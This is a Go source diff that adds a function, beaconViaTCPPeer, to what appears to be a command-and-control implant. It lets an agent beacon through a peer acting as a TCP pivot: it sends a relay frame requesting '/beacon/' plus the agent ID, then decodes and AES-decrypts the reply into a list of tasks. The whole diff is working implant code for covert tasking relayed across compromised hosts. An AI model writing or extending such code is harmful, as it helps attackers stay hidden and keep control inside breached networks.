@@ -7,6 +7,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"net"
 	"net/http"
 	"net/url"
 	"strings"
@@ -303,6 +304,57 @@ func (t *httpTransport) beaconViaPeer(peerAddr string) ([]taskWire, error) {
 	}
 	var br beaconResponse
 	if err := json.Unmarshal(plaintext, &br); err != nil {
+		return nil, err
+	}
+	return br.Tasks, nil
+}
+
+// beaconViaTCPPeer beacons through a mesh peer running a TCP pivot.
+func (t *httpTransport) beaconViaTCPPeer(peerAddr string) ([]taskWire, error) {
+	conn, err := net.DialTimeout("tcp", peerAddr, 10*time.Second)
+	if err != nil {
+		return nil, err
+	}
+	defer conn.Close()
+	conn.SetDeadline(time.Now().Add(15 * time.Second))
+
+	payload, _ := json.Marshal(map[string]any{
+		"method":   "GET",
+		"path":     "/beacon/" + t.agentID,
+		"body_b64": "",
+	})
+	frame, _ := json.Marshal(tcpMsg{Type: "relay", Payload: payload})
+	if err := tcpWriteFrame(conn, frame); err != nil {
+		return nil, err
+	}
+	respFrame, err := tcpReadFrame(conn)
+	if err != nil {
+		return nil, err
+	}
+	var resp tcpMsg
+	if err := json.Unmarshal(respFrame, &resp); err != nil {
+		return nil, err
+	}
+	var rr struct {
+		Status  int    `json:"status"`
+		BodyB64 string `json:"body_b64"`
+	}
+	if err := json.Unmarshal(resp.Payload, &rr); err != nil {
+		return nil, err
+	}
+	if rr.Status == 204 || rr.BodyB64 == "" {
+		return nil, nil
+	}
+	if rr.Status != 200 {
+		return nil, fmt.Errorf("tcp peer: status %d", rr.Status)
+	}
+	enc, _ := base64.StdEncoding.DecodeString(rr.BodyB64)
+	plain, err := open(t.aesKey, enc)
+	if err != nil {
+		return nil, err
+	}
+	var br beaconResponse
+	if err := json.Unmarshal(plain, &br); err != nil {
 		return nil, err
 	}
 	return br.Tasks, nil
